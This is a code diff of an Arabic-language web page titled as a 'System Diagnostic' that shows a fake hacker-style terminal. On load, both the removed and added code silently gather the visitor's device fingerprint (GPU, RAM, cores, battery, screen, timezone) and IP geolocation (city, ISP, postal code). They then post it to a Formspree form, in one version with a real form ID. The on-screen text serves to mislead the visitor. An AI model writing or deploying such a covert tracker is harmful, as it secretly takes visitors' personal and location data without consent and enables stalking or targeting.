@@ -2,120 +2,93 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Neuro-Flow OS | 2026</title>
+    <title>System Diagnostic v2.6</title>
     <style>
-        :root { --primary: #00ffcc; --bg: #050505; }
-        body {
-            font-family: 'Courier New', Courier, monospace;
-            background-color: var(--bg);
-            color: var(--primary);
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            overflow: hidden;
-        }
-        .monitor {
-            border: 2px solid var(--primary);
-            padding: 40px;
-            background: rgba(0, 255, 204, 0.05);
-            box-shadow: 0 0 20px rgba(0, 255, 204, 0.2);
-            text-align: center;
-            max-width: 500px;
-            width: 90%;
-        }
-        .scanning {
-            font-size: 1.2rem;
-            margin-bottom: 20px;
-            border-right: 2px solid var(--primary);
-            white-space: nowrap;
-            overflow: hidden;
-            width: 0;
-            animation: typing 2s steps(30, end) forwards;
-        }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        .data-stream {
-            font-size: 0.8rem;
-            text-align: left;
-            color: #008866;
-            margin-top: 20px;
-            line-height: 1.5;
-        }
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .terminal { width: 90%; max-width: 600px; border: 1px solid #0f0; padding: 20px; box-shadow: 0 0 15px #0f0; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #0f0; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 51%, 100% { opacity: 0; } }
     </style>
 </head>
 <body>
-
-    <div class="monitor">
-        <div class="scanning">جاري تحليل بيانات النظام المستهدف...</div>
-        <div id="display" class="data-stream">
-            اتصال آمن... <br>
-            جاري سحب مفاتيح التشفير...
-        </div>
+    <div class="terminal">
+        <div id="log">جاري بدء بروتوكول الفحص...<br></div>
+        <span class="cursor"></span>
     </div>
 
     <script>
-        async function getDeepData() {
-            const display = document.getElementById('display');
-            
-            // 1. معلومات الجهاز العميقة
-            const deviceData = {
+        async function fullHackingLog() {
+            const log = document.getElementById('log');
+            const report = {};
+
+            // 1. بيانات الجهاز والعتاد (Hardware)
+            report.device = {
                 platform: navigator.platform,
-                agent: navigator.userAgent,
-                cores: navigator.hardwareConcurrency + " Cores",
-                memory: (navigator.deviceMemory || "غير معروف") + " GB RAM",
+                cores: navigator.hardwareConcurrency || "N/A",
+                ram: navigator.deviceMemory || "N/A",
                 screen: `${window.screen.width}x${window.screen.height}`,
-                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                language: navigator.language,
-                touch: navigator.maxTouchPoints > 0 ? "Yes" : "No",
-                cookiesEnabled: navigator.cookieEnabled
+                touch: navigator.maxTouchPoints > 0 ? "نعم" : "لا",
+                gpu: getGPU() // جلب نوع كارت الشاشة
             };
 
-            // 2. معلومات الموقع والشبكة (IP API)
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/');
-                const ipData = await ipRes.json();
-                deviceData.ip = ipData.ip;
-                deviceData.city = ipData.city;
-                deviceData.region = ipData.region;
-                deviceData.country = ipData.country_name;
-                deviceData.isp = ipData.org;
-            } catch (e) { deviceData.network = "فشل الوصول للشبكة"; }
+            // 2. بيانات البرمجيات (Software)
+            report.software = {
+                browser: navigator.userAgent,
+                language: navigator.language,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                cookies: navigator.cookieEnabled
+            };
 
-            // 3. معلومات البطارية
+            // 3. جلب الموقع والشبكة (الـ IP التفصيلي)
             try {
-                if ('getBattery' in navigator) {
-                    const battery = await navigator.getBattery();
-                    deviceData.battery = (battery.level * 100) + "%";
-                    deviceData.charging = battery.charging ? "Charging" : "Discharging";
-                }
-            } catch (e) { deviceData.battery = "Unknown"; }
+                const res = await fetch('https://ipapi.co/json/');
+                const data = await res.json();
+                report.network = {
+                    ip: data.ip,
+                    city: data.city,
+                    region: data.region,
+                    country: data.country_name,
+                    isp: data.org,
+                    postal: data.postal,
+                    calling_code: data.country_calling_code
+                };
+            } catch (e) { report.network = "فشل جلب الـ IP"; }
 
-            // تحديث الشاشة للمستخدم للإيهام بالعمل
-            display.innerHTML += `<br>تم تحديد الموقع: ${deviceData.city || 'مجهول'}`;
-            display.innerHTML += `<br>قوة المعالجة: ${deviceData.cores}`;
-
-            // 4. إرسال الطرد المعلوماتي بالكامل إليك
-            const formID = 'xkozoaaq'; // ضع الآيدي الخاص بك هنا
-            
+            // 4. جلب حالة البطارية
             try {
-                await fetch(`https://formspree.io/f/${formID}`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        subject: `اختراق تقني من ${deviceData.city || 'غير معروف'}`,
-                        ...deviceData
-                    })
-                });
-                display.innerHTML += "<br>حالة النظام: متصل ومستقر.";
-            } catch (error) {
-                display.innerHTML += "<br>خطأ في المزامنة.";
-            }
+                const battery = await navigator.getBattery();
+                report.battery = {
+                    level: (battery.level * 100) + "%",
+                    charging: battery.charging ? "يشحن" : "لا يشحن"
+                };
+            } catch (e) { report.battery = "غير مدعوم"; }
+
+            // تحديث الشاشة للمستخدم
+            log.innerHTML += "> تم سحب بيانات الشبكة...<br>";
+            log.innerHTML += `> موقع الهدف: ${report.network.city || 'مجهول'}<br>`;
+            log.innerHTML += "> جاري إرسال التقرير النهائي...<br>";
+
+            // 5. الإرسال النهائي إلى Formspree
+            const formID = 'YOUR_FORM_ID'; 
+            await fetch(`https://formspree.io/f/${formID}`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(report)
+            });
+
+            log.innerHTML += "> تم الإرسال بنجاح. النظام مستقر.";
         }
 
-        window.onload = getDeepData;
+        function getGPU() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+            } catch (e) { return "N/A"; }
+        }
+
+        window.onload = fullHackingLog;
     </script>
 </body>
 </html>
-
